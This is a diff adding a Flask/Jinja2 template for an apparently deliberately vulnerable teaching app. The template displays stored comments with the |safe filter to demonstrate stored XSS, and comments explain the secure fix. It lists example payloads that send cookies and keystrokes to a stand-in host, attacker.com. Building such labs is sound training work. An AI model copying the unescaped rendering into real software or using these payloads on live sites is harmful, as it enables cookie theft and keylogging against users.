@@ -1,0 +1,83 @@
+{% extends "base.html" %}
+
+{% block title %}XSS Vulnerable Module - Display{% endblock %}
+
+{% block content %}
+<div class="xss-container">
+    <div class="xss-header">
+        <h1>Stored Content Display</h1>
+        <p class="subtitle">⚠️ Vulnerable to Stored XSS - Content Displayed Without Sanitization</p>
+    </div>
+
+    <div class="warning-box">
+        <h3>⚠️ Critical Vulnerability</h3>
+        <p><strong>All content below is displayed using the |safe filter, which disables HTML escaping.</strong></p>
+        <p>Any malicious scripts stored in the database will execute when this page loads.</p>
+    </div>
+
+    <div class="xss-actions">
+        <a href="{{ url_for('xss_submit') }}" class="btn btn-primary">Submit New Content</a>
+        <a href="{{ url_for('index') }}" class="btn btn-secondary">Back to Home</a>
+    </div>
+
+    <div class="comments-section">
+        <h2>All Comments ({{ comments|length }})</h2>
+        
+        {% if comments %}
+            {% for comment in comments %}
+            <div class="comment-card">
+                <div class="comment-header">
+                    <!-- ⚠️ CRITICAL VULNERABILITY: Stored XSS -->
+                    <!-- The |safe filter disables Jinja2's auto-escaping -->
+                    <!-- This allows HTML/JavaScript to execute instead of being displayed as text -->
+                    <!-- SECURE: Remove |safe to enable auto-escaping: {{ comment.author }} -->
+                    <strong class="comment-author">{{ comment.author|safe }}</strong>
+                    <span class="comment-date">{{ comment.created_at.strftime('%Y-%m-%d %H:%M:%S') }}</span>
+                </div>
+                
+                <div class="comment-content">
+                    <!-- ⚠️ CRITICAL VULNERABILITY: Stored XSS Execution Point -->
+                    <!-- ===================================================== -->
+                    <!-- HOW XSS OCCURS HERE: -->
+                    <!-- 1. Attacker submits malicious JavaScript in the form -->
+                    <!-- 2. Malicious code is stored in MongoDB (no sanitization) -->
+                    <!-- 3. When this template renders, |safe disables escaping -->
+                    <!-- 4. Browser receives: <script>alert('XSS')</script> -->
+                    <!-- 5. Browser executes the script instead of displaying it as text -->
+                    <!-- 
+                    SECURE SOLUTION (NOT USED - INTENTIONAL VULNERABILITY):
+                    Remove |safe filter: {{ comment.content }}
+                    Jinja2 will auto-escape: < becomes &lt;, > becomes &gt;
+                    Scripts will display as text: &lt;script&gt;alert('XSS')&lt;/script&gt;
+                    -->
+                    {{ comment.content|safe }}
+                </div>
+            </div>
+            {% endfor %}
+        {% else %}
+            <div class="no-comments">
+                <p>No comments yet. <a href="{{ url_for('xss_submit') }}">Submit the first one!</a></p>
+            </div>
+        {% endif %}
+    </div>
+
+    <div class="vuln-explanation">
+        <h3>How Stored XSS Works Here:</h3>
+        <ol>
+            <li><strong>Input:</strong> User submits malicious JavaScript (e.g., &lt;script&gt;alert('XSS')&lt;/script&gt;)</li>
+            <li><strong>Storage:</strong> Content stored in MongoDB without sanitization (see xss_submit route)</li>
+            <li><strong>Retrieval:</strong> Content fetched from MongoDB (see xss_display route)</li>
+            <li><strong>Display:</strong> Content rendered with |safe filter, disabling HTML escaping</li>
+            <li><strong>Execution:</strong> Browser interprets and executes the JavaScript code</li>
+        </ol>
+        
+        <h3>Example Attack Scenarios:</h3>
+        <ul>
+            <li><strong>Cookie Theft:</strong> &lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</li>
+            <li><strong>Keylogging:</strong> &lt;script&gt;document.onkeypress=function(e){new Image().src='http://attacker.com/keylog?key='+String.fromCharCode(e.which)}&lt;/script&gt;</li>
+            <li><strong>Session Hijacking:</strong> Steal session tokens to impersonate users</li>
+            <li><strong>Defacement:</strong> Modify page content to display malicious messages</li>
+        </ul>
+    </div>
+</div>
+{% endblock %}
